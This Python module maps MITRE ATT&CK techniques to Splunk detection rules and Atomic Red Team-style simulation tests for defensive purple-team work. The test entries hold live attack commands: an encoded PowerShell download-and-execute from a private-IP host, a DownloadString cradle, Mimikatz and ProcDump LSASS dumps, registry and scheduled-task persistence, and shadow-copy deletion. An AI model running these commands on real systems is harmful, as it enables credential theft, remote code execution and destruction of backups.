"""
MITRE ATT&CK technique definitions and mappings.

This module provides a comprehensive mapping of ATT&CK techniques
to detection opportunities, data sources, and simulation procedures.

References:
- MITRE ATT&CK: https://attack.mitre.org/
- Atomic Red Team: https://atomicredteam.io/
- Splunk Security Content: https://github.com/splunk/security_content
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class Tactic(str, Enum):
    """MITRE ATT&CK Tactics (Kill Chain Phases)."""

    RECONNAISSANCE = "reconnaissance"
    RESOURCE_DEVELOPMENT = "resource-development"
    INITIAL_ACCESS = "initial-access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege-escalation"
    DEFENSE_EVASION = "defense-evasion"
    CREDENTIAL_ACCESS = "credential-access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral-movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command-and-control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


class Platform(str, Enum):
    """Target platforms for techniques."""

    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    CLOUD = "cloud"
    AZURE_AD = "azure-ad"
    OFFICE_365 = "office-365"
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    SAAS = "saas"
    NETWORK = "network"
    CONTAINERS = "containers"


class DataSource(str, Enum):
    """Data sources for detection."""

    # Endpoint
    PROCESS_CREATION = "process_creation"
    PROCESS_TERMINATION = "process_termination"
    FILE_CREATION = "file_creation"
    FILE_MODIFICATION = "file_modification"
    FILE_DELETION = "file_deletion"
    REGISTRY_KEY_CREATION = "registry_key_creation"
    REGISTRY_KEY_MODIFICATION = "registry_key_modification"
    REGISTRY_VALUE_MODIFICATION = "registry_value_modification"
    WINDOWS_EVENT_LOG = "windows_event_log"
    SYSMON = "sysmon"
    POWERSHELL_LOG = "powershell_log"
    WMI_EVENT = "wmi_event"
    SCHEDULED_TASK = "scheduled_task"
    SERVICE_CREATION = "service_creation"

    # Network
    NETWORK_CONNECTION = "network_connection"
    DNS_QUERY = "dns_query"
    HTTP_REQUEST = "http_request"
    TLS_HANDSHAKE = "tls_handshake"
    FIREWALL_LOG = "firewall_log"
    PROXY_LOG = "proxy_log"
    IDS_ALERT = "ids_alert"
    NETFLOW = "netflow"

    # Authentication
    AUTHENTICATION_LOG = "authentication_log"
    LOGON_SESSION = "logon_session"
    KERBEROS_LOG = "kerberos_log"
    LDAP_LOG = "ldap_log"

    # Cloud
    CLOUD_AUDIT_LOG = "cloud_audit_log"
    AWS_CLOUDTRAIL = "aws_cloudtrail"
    AZURE_ACTIVITY_LOG = "azure_activity_log"
    GCP_AUDIT_LOG = "gcp_audit_log"
    O365_AUDIT_LOG = "o365_audit_log"

    # Security Tools
    ANTIVIRUS_LOG = "antivirus_log"
    EDR_ALERT = "edr_alert"
    DLP_ALERT = "dlp_alert"
    EMAIL_LOG = "email_log"


@dataclass
class Technique:
    """
    MITRE ATT&CK Technique definition.

    Includes detection opportunities and simulation procedures.
    """

    id: str  # e.g., "T1059.001"
    name: str
    tactics: list[Tactic]
    platforms: list[Platform]
    description: str
    detection_description: str
    data_sources: list[DataSource]

    # Atomic Red Team compatible test procedures
    atomic_tests: list[dict[str, Any]] = field(default_factory=list)

    # Detection rules (Splunk SPL)
    detection_rules: list[dict[str, Any]] = field(default_factory=list)

    # Sub-techniques
    sub_techniques: list[str] = field(default_factory=list)

    # References
    references: list[str] = field(default_factory=list)

    # Severity for prioritization
    severity: str = "medium"  # low, medium, high, critical


# =============================================================================
# Core Technique Library
# Organized by Tactic (Kill Chain Phase)
# =============================================================================

TECHNIQUE_LIBRARY: dict[str, Technique] = {
    # =========================================================================
    # INITIAL ACCESS
    # =========================================================================
    "T1566.001": Technique(
        id="T1566.001",
        name="Spearphishing Attachment",
        tactics=[Tactic.INITIAL_ACCESS],
        platforms=[Platform.WINDOWS, Platform.MACOS, Platform.LINUX],
        description="Adversaries send spearphishing emails with malicious attachments to gain access.",
        detection_description="Monitor for suspicious email attachments and Office documents with macros.",
        data_sources=[
            DataSource.EMAIL_LOG,
            DataSource.FILE_CREATION,
            DataSource.PROCESS_CREATION,
        ],
        severity="high",
        atomic_tests=[
            {
                "name": "Download Macro-Enabled Document",
                "description": "Simulates downloading a macro-enabled document",
                "supported_platforms": ["windows"],
                "input_arguments": {
                    "file_url": {"type": "url", "default": "https://example.com/doc.docm"}
                },
                "executor": {
                    "command": "Invoke-WebRequest -Uri #{file_url} -OutFile $env:TEMP\\malicious.docm",
                    "name": "powershell",
                },
            }
        ],
        detection_rules=[
            {
                "name": "Suspicious Office Document Download",
                "search": """
index=proxy sourcetype=squid OR sourcetype=bluecoat
| regex url="\\.(docm|xlsm|pptm|doc|xls)$"
| stats count by src_ip, dest_host, url
| where count > 5
""",
            }
        ],
    ),
    "T1566.002": Technique(
        id="T1566.002",
        name="Spearphishing Link",
        tactics=[Tactic.INITIAL_ACCESS],
        platforms=[Platform.WINDOWS, Platform.MACOS, Platform.LINUX, Platform.SAAS],
        description="Adversaries send spearphishing emails with malicious links.",
        detection_description="Monitor for clicks on suspicious URLs in emails and subsequent downloads.",
        data_sources=[
            DataSource.EMAIL_LOG,
            DataSource.PROXY_LOG,
            DataSource.DNS_QUERY,
        ],
        severity="high",
    ),
    "T1190": Technique(
        id="T1190",
        name="Exploit Public-Facing Application",
        tactics=[Tactic.INITIAL_ACCESS],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.CONTAINERS, Platform.NETWORK],
        description="Adversaries exploit vulnerabilities in internet-facing applications.",
        detection_description="Monitor web application logs for exploitation attempts (SQLi, XSS, RCE).",
        data_sources=[
            DataSource.HTTP_REQUEST,
            DataSource.IDS_ALERT,
            DataSource.FIREWALL_LOG,
        ],
        severity="critical",
        detection_rules=[
            {
                "name": "Web Application Exploitation Attempt",
                "search": """
index=web sourcetype=access_combined OR sourcetype=iis
| regex uri_path="(\\.\\./|;|\\||`|\\$\\(|<script|union.*select)"
| stats count by src_ip, uri_path, status
| where count > 10
""",
            }
        ],
    ),
    # =========================================================================
    # EXECUTION
    # =========================================================================
    "T1059.001": Technique(
        id="T1059.001",
        name="PowerShell",
        tactics=[Tactic.EXECUTION],
        platforms=[Platform.WINDOWS],
        description="Adversaries abuse PowerShell for execution and scripting.",
        detection_description="Monitor PowerShell script block logging and command-line arguments.",
        data_sources=[
            DataSource.PROCESS_CREATION,
            DataSource.POWERSHELL_LOG,
            DataSource.SYSMON,
        ],
        severity="high",
        atomic_tests=[
            {
                "name": "Encoded PowerShell Command",
                "description": "Execute base64 encoded PowerShell",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "powershell.exe -enc #{encoded_command}",
                    "name": "command_prompt",
                },
                "input_arguments": {
                    "encoded_command": {
                        "type": "string",
                        "default": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA",
                    }
                },
            },
            {
                "name": "Download Cradle",
                "description": "PowerShell download and execute",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "IEX (New-Object Net.WebClient).DownloadString('#{url}')",
                    "name": "powershell",
                },
            },
        ],
        detection_rules=[
            {
                "name": "Encoded PowerShell Execution",
                "search": """
index=wineventlog EventCode=4104 OR EventCode=4103
| regex ScriptBlockText="(?i)(invoke-expression|iex|downloadstring|webclient|bitstransfer)"
| stats count by ComputerName, ScriptBlockText
""",
            },
            {
                "name": "PowerShell with Encoded Command",
                "search": """
index=sysmon EventCode=1 Image="*powershell.exe"
| regex CommandLine="(?i)(-enc|-encodedcommand|-e )"
| table _time, ComputerName, User, CommandLine
""",
            },
        ],
    ),
    "T1059.003": Technique(
        id="T1059.003",
        name="Windows Command Shell",
        tactics=[Tactic.EXECUTION],
        platforms=[Platform.WINDOWS],
        description="Adversaries abuse cmd.exe to execute commands.",
        detection_description="Monitor for cmd.exe execution with suspicious command-line arguments.",
        data_sources=[DataSource.PROCESS_CREATION, DataSource.SYSMON],
        severity="medium",
        detection_rules=[
            {
                "name": "Suspicious cmd.exe Execution",
                "search": """
index=sysmon EventCode=1 Image="*\\cmd.exe"
| regex CommandLine="(?i)(whoami|net user|net group|systeminfo|tasklist)"
| stats count by ComputerName, ParentImage, CommandLine
""",
            }
        ],
    ),
    "T1047": Technique(
        id="T1047",
        name="Windows Management Instrumentation",
        tactics=[Tactic.EXECUTION],
        platforms=[Platform.WINDOWS],
        description="Adversaries abuse WMI for execution and lateral movement.",
        detection_description="Monitor for WMI process creation and remote WMI connections.",
        data_sources=[DataSource.WMI_EVENT, DataSource.PROCESS_CREATION, DataSource.SYSMON],
        severity="high",
        atomic_tests=[
            {
                "name": "WMI Process Creation",
                "description": "Create process via WMI",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": 'wmic process call create "#{process_to_execute}"',
                    "name": "command_prompt",
                },
                "input_arguments": {
                    "process_to_execute": {"type": "string", "default": "notepad.exe"}
                },
            }
        ],
    ),
    # =========================================================================
    # PERSISTENCE
    # =========================================================================
    "T1053.005": Technique(
        id="T1053.005",
        name="Scheduled Task",
        tactics=[Tactic.EXECUTION, Tactic.PERSISTENCE, Tactic.PRIVILEGE_ESCALATION],
        platforms=[Platform.WINDOWS],
        description="Adversaries create scheduled tasks for persistence.",
        detection_description="Monitor scheduled task creation via schtasks.exe or Task Scheduler.",
        data_sources=[DataSource.SCHEDULED_TASK, DataSource.PROCESS_CREATION, DataSource.SYSMON],
        severity="high",
        atomic_tests=[
            {
                "name": "Create Scheduled Task",
                "description": "Create a scheduled task for persistence",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": 'schtasks /create /tn "#{task_name}" /tr "#{command}" /sc daily /st 09:00',
                    "name": "command_prompt",
                },
                "input_arguments": {
                    "task_name": {"type": "string", "default": "SecurityUpdate"},
                    "command": {"type": "string", "default": "powershell.exe -ep bypass -file C:\\temp\\script.ps1"},
                },
            }
        ],
        detection_rules=[
            {
                "name": "Scheduled Task Creation",
                "search": """
index=wineventlog EventCode=4698 OR (index=sysmon EventCode=1 Image="*schtasks.exe")
| stats count by ComputerName, TaskName, Command
""",
            }
        ],
    ),
    "T1543.003": Technique(
        id="T1543.003",
        name="Windows Service",
        tactics=[Tactic.PERSISTENCE, Tactic.PRIVILEGE_ESCALATION],
        platforms=[Platform.WINDOWS],
        description="Adversaries create or modify Windows services for persistence.",
        detection_description="Monitor for new service installation or modification.",
        data_sources=[DataSource.SERVICE_CREATION, DataSource.REGISTRY_KEY_MODIFICATION],
        severity="high",
        detection_rules=[
            {
                "name": "New Service Installation",
                "search": """
index=wineventlog EventCode=7045
| table _time, ComputerName, ServiceName, ImagePath, ServiceType
""",
            }
        ],
    ),
    "T1547.001": Technique(
        id="T1547.001",
        name="Registry Run Keys / Startup Folder",
        tactics=[Tactic.PERSISTENCE, Tactic.PRIVILEGE_ESCALATION],
        platforms=[Platform.WINDOWS],
        description="Adversaries add programs to Run keys or Startup folder.",
        detection_description="Monitor Registry Run key modifications and Startup folder additions.",
        data_sources=[DataSource.REGISTRY_KEY_MODIFICATION, DataSource.FILE_CREATION],
        severity="high",
        atomic_tests=[
            {
                "name": "Add Run Key Persistence",
                "description": "Add Registry Run key for persistence",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "#{name}" /t REG_SZ /d "#{command}" /f',
                    "name": "command_prompt",
                },
            }
        ],
    ),
    # =========================================================================
    # PRIVILEGE ESCALATION
    # =========================================================================
    "T1055": Technique(
        id="T1055",
        name="Process Injection",
        tactics=[Tactic.DEFENSE_EVASION, Tactic.PRIVILEGE_ESCALATION],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries inject code into processes to evade detection and escalate privileges.",
        detection_description="Monitor for suspicious process access, memory allocation, and thread creation.",
        data_sources=[DataSource.PROCESS_CREATION, DataSource.SYSMON],
        severity="critical",
        sub_techniques=["T1055.001", "T1055.002", "T1055.003", "T1055.004", "T1055.012"],
        detection_rules=[
            {
                "name": "Process Injection via CreateRemoteThread",
                "search": """
index=sysmon EventCode=8
| stats count by SourceImage, TargetImage
| where SourceImage!=TargetImage
""",
            }
        ],
    ),
    # =========================================================================
    # CREDENTIAL ACCESS
    # =========================================================================
    "T1003.001": Technique(
        id="T1003.001",
        name="LSASS Memory",
        tactics=[Tactic.CREDENTIAL_ACCESS],
        platforms=[Platform.WINDOWS],
        description="Adversaries dump credentials from LSASS memory.",
        detection_description="Monitor for LSASS memory access by unusual processes.",
        data_sources=[DataSource.PROCESS_CREATION, DataSource.SYSMON],
        severity="critical",
        atomic_tests=[
            {
                "name": "Dump LSASS with Mimikatz",
                "description": "Use Mimikatz to dump LSASS",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "mimikatz.exe sekurlsa::logonpasswords exit",
                    "name": "command_prompt",
                    "elevation_required": True,
                },
            },
            {
                "name": "Dump LSASS with ProcDump",
                "description": "Use ProcDump to dump LSASS memory",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "procdump.exe -ma lsass.exe lsass.dmp",
                    "name": "command_prompt",
                    "elevation_required": True,
                },
            },
        ],
        detection_rules=[
            {
                "name": "LSASS Memory Access",
                "search": """
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where SourceImage!="*\\MsMpEng.exe" AND SourceImage!="*\\csrss.exe"
| stats count by SourceImage, GrantedAccess
| where GrantedAccess="0x1010" OR GrantedAccess="0x1410"
""",
            }
        ],
    ),
    "T1003.002": Technique(
        id="T1003.002",
        name="Security Account Manager",
        tactics=[Tactic.CREDENTIAL_ACCESS],
        platforms=[Platform.WINDOWS],
        description="Adversaries extract credential material from the SAM database.",
        detection_description="Monitor for reg.exe or secretsdump accessing SAM, SYSTEM, SECURITY hives.",
        data_sources=[DataSource.REGISTRY_KEY_MODIFICATION, DataSource.PROCESS_CREATION],
        severity="critical",
    ),
    "T1110.001": Technique(
        id="T1110.001",
        name="Password Guessing",
        tactics=[Tactic.CREDENTIAL_ACCESS],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS, Platform.AZURE_AD, Platform.OFFICE_365],
        description="Adversaries attempt to guess passwords for valid accounts.",
        detection_description="Monitor for multiple failed authentication attempts.",
        data_sources=[DataSource.AUTHENTICATION_LOG, DataSource.LOGON_SESSION],
        severity="medium",
        detection_rules=[
            {
                "name": "Brute Force Authentication",
                "search": """
index=wineventlog EventCode=4625
| stats count by TargetUserName, IpAddress
| where count > 10
""",
            }
        ],
    ),
    "T1110.003": Technique(
        id="T1110.003",
        name="Password Spraying",
        tactics=[Tactic.CREDENTIAL_ACCESS],
        platforms=[Platform.WINDOWS, Platform.AZURE_AD, Platform.OFFICE_365, Platform.SAAS],
        description="Adversaries use a single or small list of passwords against many accounts.",
        detection_description="Monitor for many failed logins across different accounts from same source.",
        data_sources=[DataSource.AUTHENTICATION_LOG, DataSource.AZURE_ACTIVITY_LOG],
        severity="high",
        detection_rules=[
            {
                "name": "Password Spraying Attack",
                "search": """
index=wineventlog EventCode=4625
| stats dc(TargetUserName) as unique_users, count by IpAddress
| where unique_users > 20 AND count > 50
""",
            }
        ],
    ),
    # =========================================================================
    # DISCOVERY
    # =========================================================================
    "T1082": Technique(
        id="T1082",
        name="System Information Discovery",
        tactics=[Tactic.DISCOVERY],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries gather system information.",
        detection_description="Monitor for execution of systeminfo, uname, or similar commands.",
        data_sources=[DataSource.PROCESS_CREATION],
        severity="low",
        atomic_tests=[
            {
                "name": "System Information Discovery",
                "description": "Run systeminfo to gather system details",
                "supported_platforms": ["windows"],
                "executor": {"command": "systeminfo", "name": "command_prompt"},
            }
        ],
    ),
    "T1087.001": Technique(
        id="T1087.001",
        name="Local Account Discovery",
        tactics=[Tactic.DISCOVERY],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries enumerate local user accounts.",
        detection_description="Monitor for net user, wmic useraccount, or similar commands.",
        data_sources=[DataSource.PROCESS_CREATION],
        severity="low",
        atomic_tests=[
            {
                "name": "Enumerate Local Users",
                "description": "List local user accounts",
                "supported_platforms": ["windows"],
                "executor": {"command": "net user", "name": "command_prompt"},
            }
        ],
    ),
    "T1069.002": Technique(
        id="T1069.002",
        name="Domain Groups Discovery",
        tactics=[Tactic.DISCOVERY],
        platforms=[Platform.WINDOWS],
        description="Adversaries enumerate domain groups.",
        detection_description="Monitor for net group /domain or LDAP queries for groups.",
        data_sources=[DataSource.PROCESS_CREATION, DataSource.LDAP_LOG],
        severity="medium",
    ),
    # =========================================================================
    # LATERAL MOVEMENT
    # =========================================================================
    "T1021.001": Technique(
        id="T1021.001",
        name="Remote Desktop Protocol",
        tactics=[Tactic.LATERAL_MOVEMENT],
        platforms=[Platform.WINDOWS],
        description="Adversaries use RDP to move laterally.",
        detection_description="Monitor for RDP connections, especially from unusual sources.",
        data_sources=[DataSource.AUTHENTICATION_LOG, DataSource.NETWORK_CONNECTION],
        severity="high",
        detection_rules=[
            {
                "name": "Unusual RDP Connection",
                "search": """
index=wineventlog EventCode=4624 LogonType=10
| stats count by TargetUserName, IpAddress, ComputerName
| lookup known_rdp_sources IpAddress OUTPUT is_known
| where isnull(is_known)
""",
            }
        ],
    ),
    "T1021.002": Technique(
        id="T1021.002",
        name="SMB/Windows Admin Shares",
        tactics=[Tactic.LATERAL_MOVEMENT],
        platforms=[Platform.WINDOWS],
        description="Adversaries use Windows Admin Shares for lateral movement.",
        detection_description="Monitor for connections to C$, ADMIN$, IPC$ shares.",
        data_sources=[DataSource.NETWORK_CONNECTION, DataSource.AUTHENTICATION_LOG],
        severity="high",
    ),
    "T1021.006": Technique(
        id="T1021.006",
        name="Windows Remote Management",
        tactics=[Tactic.LATERAL_MOVEMENT],
        platforms=[Platform.WINDOWS],
        description="Adversaries use WinRM for lateral movement.",
        detection_description="Monitor for WinRM connections and PowerShell remoting.",
        data_sources=[DataSource.NETWORK_CONNECTION, DataSource.PROCESS_CREATION],
        severity="high",
    ),
    # =========================================================================
    # COMMAND AND CONTROL
    # =========================================================================
    "T1071.001": Technique(
        id="T1071.001",
        name="Web Protocols",
        tactics=[Tactic.COMMAND_AND_CONTROL],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries use HTTP/HTTPS for C2 communication.",
        detection_description="Monitor for beaconing patterns and unusual HTTP traffic.",
        data_sources=[DataSource.PROXY_LOG, DataSource.HTTP_REQUEST, DataSource.DNS_QUERY],
        severity="high",
        detection_rules=[
            {
                "name": "HTTP Beaconing Detection",
                "search": """
index=proxy sourcetype=squid
| bucket _time span=5m
| stats count by src_ip, dest_host, _time
| streamstats window=12 stdev(count) as stdev, avg(count) as avg by src_ip, dest_host
| where stdev < (avg * 0.1)
""",
            }
        ],
    ),
    "T1071.004": Technique(
        id="T1071.004",
        name="DNS",
        tactics=[Tactic.COMMAND_AND_CONTROL],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries use DNS for C2 communication or data exfiltration.",
        detection_description="Monitor for DNS tunneling, high entropy domains, or unusual query patterns.",
        data_sources=[DataSource.DNS_QUERY],
        severity="high",
        detection_rules=[
            {
                "name": "DNS Tunneling Detection",
                "search": """
index=dns
| eval query_len=len(query)
| where query_len > 50
| rex field=query "(?<subdomain>[^.]+)\\.(?<domain>[^.]+\\.[^.]+)$"
| eval entropy=0  # Calculate Shannon entropy
| where entropy > 3.5
| stats count by domain
""",
            }
        ],
    ),
    "T1105": Technique(
        id="T1105",
        name="Ingress Tool Transfer",
        tactics=[Tactic.COMMAND_AND_CONTROL],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries transfer tools or files from external systems.",
        detection_description="Monitor for downloads of executables or scripts from external sources.",
        data_sources=[DataSource.PROXY_LOG, DataSource.FILE_CREATION, DataSource.PROCESS_CREATION],
        severity="high",
        detection_rules=[
            {
                "name": "Executable Download via PowerShell",
                "search": """
index=sysmon EventCode=1 Image="*powershell.exe"
| regex CommandLine="(?i)(downloadfile|invoke-webrequest|wget|curl|bitstransfer)"
| table _time, ComputerName, User, CommandLine
""",
            }
        ],
    ),
    # =========================================================================
    # EXFILTRATION
    # =========================================================================
    "T1041": Technique(
        id="T1041",
        name="Exfiltration Over C2 Channel",
        tactics=[Tactic.EXFILTRATION],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries exfiltrate data over the C2 channel.",
        detection_description="Monitor for large outbound data transfers, especially encrypted.",
        data_sources=[DataSource.NETWORK_CONNECTION, DataSource.PROXY_LOG],
        severity="critical",
    ),
    "T1567.002": Technique(
        id="T1567.002",
        name="Exfiltration to Cloud Storage",
        tactics=[Tactic.EXFILTRATION],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries exfiltrate data to cloud storage services.",
        detection_description="Monitor for uploads to cloud storage (Dropbox, GDrive, OneDrive, S3).",
        data_sources=[DataSource.PROXY_LOG, DataSource.CLOUD_AUDIT_LOG],
        severity="high",
        detection_rules=[
            {
                "name": "Exfiltration to Cloud Storage",
                "search": """
index=proxy
| regex dest_host="(dropbox|drive.google|onedrive|s3.amazonaws|blob.core.windows)"
| where bytes_out > 10000000
| stats sum(bytes_out) as total_bytes by src_ip, dest_host
""",
            }
        ],
    ),
    # =========================================================================
    # IMPACT
    # =========================================================================
    "T1486": Technique(
        id="T1486",
        name="Data Encrypted for Impact",
        tactics=[Tactic.IMPACT],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries encrypt data to disrupt availability (ransomware).",
        detection_description="Monitor for mass file encryption, ransom notes, and suspicious processes.",
        data_sources=[DataSource.FILE_MODIFICATION, DataSource.FILE_CREATION, DataSource.PROCESS_CREATION],
        severity="critical",
        detection_rules=[
            {
                "name": "Ransomware File Activity",
                "search": """
index=sysmon EventCode=11
| regex TargetFilename="\\.(encrypted|locked|crypted|enc|cry)$"
| stats count by ComputerName, Image
| where count > 100
""",
            }
        ],
    ),
    "T1490": Technique(
        id="T1490",
        name="Inhibit System Recovery",
        tactics=[Tactic.IMPACT],
        platforms=[Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        description="Adversaries delete backups or disable recovery features.",
        detection_description="Monitor for vssadmin, wbadmin, bcdedit modifications.",
        data_sources=[DataSource.PROCESS_CREATION],
        severity="critical",
        atomic_tests=[
            {
                "name": "Delete Volume Shadow Copies",
                "description": "Delete Windows Shadow Copies",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "vssadmin.exe delete shadows /all /quiet",
                    "name": "command_prompt",
                    "elevation_required": True,
                },
            }
        ],
        detection_rules=[
            {
                "name": "Shadow Copy Deletion",
                "search": """
index=sysmon EventCode=1
| regex CommandLine="(?i)(vssadmin.*delete|wmic.*shadowcopy.*delete|bcdedit.*recoveryenabled.*no)"
| table _time, ComputerName, User, CommandLine
""",
            }
        ],
    ),
}


def get_techniques_by_tactic(tactic: Tactic) -> list[Technique]:
    """Get all techniques for a specific tactic."""
    return [t for t in TECHNIQUE_LIBRARY.values() if tactic in t.tactics]


def get_techniques_by_data_source(data_source: DataSource) -> list[Technique]:
    """Get all techniques detectable by a specific data source."""
    return [t for t in TECHNIQUE_LIBRARY.values() if data_source in t.data_sources]


def get_technique_by_id(technique_id: str) -> Technique | None:
    """Get a technique by its ATT&CK ID."""
    return TECHNIQUE_LIBRARY.get(technique_id)
